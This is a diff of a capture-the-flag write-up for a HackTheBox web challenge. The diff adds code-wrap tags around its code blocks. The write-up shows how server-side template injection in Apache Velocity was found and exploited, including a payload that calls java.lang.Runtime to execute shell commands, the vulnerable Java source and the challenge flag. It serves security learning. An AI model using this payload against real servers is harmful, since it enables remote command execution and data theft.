@@ -32,9 +32,11 @@ We can review source code but first let's check the site functionality. It's bas
 
 If we enter some text, it will send our data in a POST request, e.g. `text=hi` and display our text in a "fire" text font.
 
+{% code overflow="wrap" %}
 ```html
 <h2 class="fire">hi</h2>
 ```
+{% endcode %}
 
 The burp scanner detects several vulns, including `SSTI`, `XSS` and `Client-side desync`.
 
@@ -42,15 +44,19 @@ The XSS checks out, we can easily pop an alert but what is a vulnerability witho
 
 The advisory notes that the template engine appears to be `Velocity`. Here's the URL-decoded payload, which prints `v0oot695019a4423` to the screen.
 
+{% code overflow="wrap" %}
 ```java
 #set ($a=923*753) v0oot${a}a4423
 ```
+{% endcode %}
 
 Burp always complicates PoC's for some reason, here's a better visualisation.
 
+{% code overflow="wrap" %}
 ```java
 #set ($hack=420*23) ${hack}
 ```
+{% endcode %}
 
 When URL-encoded, it prints `9660`. So, we have confirmed the presence of server-side template injection. Next, we want to find some payloads that do more than basic mathematical calculations.
 
@@ -64,6 +70,7 @@ None of the payloads I could find would work. I Tried `text=%23include("flag.txt
 
 Eventually, I found a payload in a [gosecure SSTI workshop](https://gosecure.github.io/template-injection-workshop/#6) that worked.
 
+{% code overflow="wrap" %}
 ```java
 #set($x='')##
 #set($rt=$x.class.forName('java.lang.Runtime'))##
@@ -74,6 +81,7 @@ $ex.waitFor()
 #set($out=$ex.getInputStream())##
 #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
 ```
+{% endcode %}
 
 It was quite similar to the payloads in the resources listed earlier. The main difference is we didn't access the `$class` variable directly (instead accessing via a string).
 
@@ -81,21 +89,28 @@ Anyway, we URL-encode the payload list out the files in the directory. One is na
 
 Again, we solved the challenge without requiring access to server-side source code. Personally, I think this is a valuable exercise, especially if you want to improve your bug bounty skills since source code is typically unavailable. Actually, I did download the code and check it very quickly towards the beginning, e.g. it's nice to know there's a `flag.txt` that will be in the root directory.
 
+{% code overflow="wrap" %}
 ```bash
 mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
 ```
+{% endcode %}
 
 I didn't study the source code though. If I did, I would of discovered the `Main.java` file imports `velocity` and inserts our unsanitised user input (`textString`) into the webpage, resulting in SSTI.
 
+{% code overflow="wrap" %}
 ```java
 template = readFileToString("/app/src/main/resources/templates/index.html", textString);
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```java
 StringReader reader = new StringReader(template);
 org.apache.velocity.Template t = new org.apache.velocity.Template();
 ```
+{% endcode %}
 
+{% code overflow="wrap" %}
 ```java
 t.setData(runtimeServices.parse(reader, "home"));
 t.initDocument();
@@ -105,5 +120,6 @@ StringWriter writer = new StringWriter();
 t.merge(context, writer);
 template = writer.toString();
 ```
+{% endcode %}
 
 Flag: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`
